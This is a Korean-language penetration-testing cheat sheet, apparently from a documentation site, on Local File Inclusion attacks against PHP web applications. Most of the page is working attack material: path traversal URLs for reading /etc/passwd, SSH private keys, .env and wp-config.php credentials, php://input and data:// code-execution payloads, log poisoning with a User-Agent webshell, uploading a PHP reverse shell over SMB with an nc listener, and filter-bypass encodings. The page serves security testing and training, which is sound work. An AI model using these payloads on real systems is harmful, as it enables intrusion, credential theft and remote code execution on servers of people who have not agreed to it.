---
sidebar_position: 1
title: LFI (Local File Inclusion)
---

# LFI (Local File Inclusion)

## 개념

**LFI**: 웹 애플리케이션이 파일을 포함시킬 때, 공격자가 원하는 파일을 읽도록 하는 취약점

### 공격 예시
```
http://example.com/index.php?file=../../../../../etc/passwd
```

## 공격 조건

1. **입력 검증 부재**: 경로 변경 가능 (`../../`)
2. **파일 읽기 권한**: 웹 프로세스 소유자가 읽을 수 있어야 함
3. **파일 존재**: 파일 시스템에 파일이 있어야 함

## 주요 타겟 파일

### 시스템 파일

```bash
# 사용자 계정 정보
/etc/passwd

# 비밀번호 해시 (권한 필요)
/etc/shadow

# 호스트 맵핑
/etc/hosts

# 웹 서버 로그
/var/log/apache2/access.log
/var/log/nginx/access.log
```

### 서비스 설정 파일

```bash
# Samba
/etc/samba/smb.conf

# NFS
/etc/exports

# MySQL
/etc/mysql/my.cnf

# Apache
/etc/apache2/apache2.conf

# Nginx
/etc/nginx/nginx.conf
```

### 사용자 파일

```bash
# Bash 히스토리
/home/<user>/.bash_history

# MySQL 히스토리
/home/<user>/.mysql_history

# MySQL 설정 (비밀번호 포함 가능)
/home/<user>/.my.cnf

# SSH 개인키
/home/<user>/.ssh/id_rsa

# SSH 공개키
/home/<user>/.ssh/id_rsa.pub
```

### 웹 애플리케이션 파일

```bash
# WordPress 설정 (DB 계정 정보)
/var/www/html/wp-config.php

# 웹 루트
/var/www/html/index.php

# 환경 변수 파일
/var/www/html/.env
```

## 기본 LFI 공격

```bash
# 기본 파일 읽기
http://<target>/page.php?file=/etc/passwd

# 경로 탐색
http://<target>/page.php?file=../../../../../../etc/passwd

# 현재 디렉토리
http://<target>/page.php?file=./config.php
```

## LFI to RCE (코드 실행)

### SMB + LFI 조합

**시나리오:**
1. SMB에 파일 업로드 가능
2. LFI로 업로드한 파일 실행

```bash
# 1. Samba 설정 확인
http://<target>/lfi.php?file=/etc/samba/smb.conf

# 2. PHP 리버스 쉘 준비
cp /usr/share/webshells/php/php-reverse-shell.php .
vim php-reverse-shell.php  # IP, Port 수정

# 3. SMB로 업로드
smbclient \\\\<target>\\share
smb> put php-reverse-shell.php

# 4. 리스너 시작
nc -lvnp 1234

# 5. LFI로 실행
http://<target>/lfi.php?file=/samba/php-reverse-shell.php
```

### Log Poisoning

웹 서버 로그에 PHP 코드 삽입 후 실행:

```bash
# 1. User-Agent에 PHP 코드 삽입
curl -A "<?php system(\$_GET['cmd']); ?>" http://<target>/

# 2. LFI로 로그 파일 실행
http://<target>/lfi.php?file=/var/log/apache2/access.log&cmd=id
```

## PHP Wrapper 활용

### php://filter (Base64 인코딩)

```bash
# PHP 소스코드를 Base64로 읽기
http://<target>/lfi.php?file=php://filter/convert.base64-encode/resource=index.php

# Base64 디코딩
echo "<base64>" | base64 -d
```

### php://input (POST 데이터 실행)

```bash
# POST로 PHP 코드 전송
curl -X POST --data "<?php system('whoami'); ?>" \
  "http://<target>/lfi.php?file=php://input"
```

### data:// (데이터 URI)

```bash
# 직접 PHP 코드 실행
http://<target>/lfi.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# Base64: <?php system('id'); ?>
```

## 우회 기법

### Null Byte (PHP < 5.3.4)

```bash
http://<target>/lfi.php?file=../../../../../etc/passwd%00
```

### 이중 인코딩

```bash
# ../ → %2e%2e%2f → %252e%252e%252f
http://<target>/lfi.php?file=%252e%252e%252f%252e%252e%252fetc/passwd
```

### 필터 우회

```bash
# ../ 필터 우회
....//....//....//etc/passwd

# 절대 경로
/var/www/../../etc/passwd
```

## 주요 명령어 요약

```bash
# 기본 LFI
curl "http://<target>/lfi.php?file=/etc/passwd"

# PHP Filter
curl "http://<target>/lfi.php?file=php://filter/convert.base64-encode/resource=config.php"

# Log Poisoning
curl -A "<?php system('id'); ?>" http://<target>/
curl "http://<target>/lfi.php?file=/var/log/apache2/access.log"

# SMB 업로드
smbclient \\\\<target>\\share
put shell.php

# LFI로 실행
curl "http://<target>/lfi.php?file=/samba/shell.php"
```

## 자동화 도구

### LFISuite

```bash
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python3 lfisuite.py
```

### dotdotpwn

```bash
dotdotpwn -m http -h <target> -x 80 -f /etc/passwd
```

## 실무 팁

- ⚠️ 파일 업로드 후 항상 삭제 및 문서화
- 랜덤 파일명 사용 (예: `abc123xyz.php`)
- LFI 발견 시 설정 파일부터 확인
- 다른 취약점과 조합하여 공격
